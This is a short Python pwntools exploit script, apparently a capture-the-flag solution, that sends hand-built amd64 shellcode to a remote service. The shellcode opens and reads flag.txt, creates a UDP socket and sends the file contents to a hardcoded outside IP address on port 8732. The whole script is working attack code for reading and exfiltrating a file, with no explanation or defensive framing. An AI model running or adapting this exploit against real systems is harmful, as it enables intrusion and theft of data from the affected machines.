#!/usr/bin/env python3

from pwn import *
import sys

IP = sys.argv[1]
PORT = 17105

r = remote(IP, PORT)

context.arch = 'amd64'

shellcode = asm("push 0")
shellcode += asm("push rdi")
shellcode += asm(shellcraft.amd64.pushstr("flag.txt"))
# file open code
# set syscall number
shellcode += asm("push 2")
shellcode += asm("pop rax")
# set buf to stack with flag.txt string
shellcode += asm("push rsp")
shellcode += asm("pop rdi")
# set flags and mode
shellcode += asm("push rbx; pop rsi; push rbx; pop rdx;")
shellcode += asm("syscall") # open /tmp/flag.txt to read

shellcode += asm("push 0; pop rdi; push rbp; pop rsi")
shellcode += asm("mov dl, 0xb8")
shellcode += asm("syscall") # read file data to stack

shellcode += asm("push rax; push 0x29; pop rax; xor dl, dl")
shellcode += asm("mov dil, 2") # set rdi to 2
shellcode += asm("mov rsi, rdi") # set rsi to 2
shellcode += asm("syscall") # create UDP socket

shellcode += asm("xchg rdi, rax") # set rdi to 1 (socket fd)
shellcode += asm("push rbp; pop rsi") # set rdi to our buffer
shellcode += asm("pop rdx;") # set rdx to size, 
shellcode += asm("xor r10, r10") # set r10 to 0
shellcode += asm("mov r9b, 0x10") # set r9 (addr_len)
shellcode += asm("pop rbx; pop rbx; push rsp; pop r8") # set r8 to struct
shellcode += asm("mov al, 0x2c") # syscall code
shellcode += asm("syscall") # sendto data

arg = p16(0x2) + p16(0x1c22) + p32(0xcdf03d80) # our IP, port 8732
arg = u64(arg)

r.recvuntil(": ")
r.send(shellcode)
print(len(shellcode))
print(shellcode)
r.recvuntil(": ")
r.sendline(str(arg))

r.interactive()
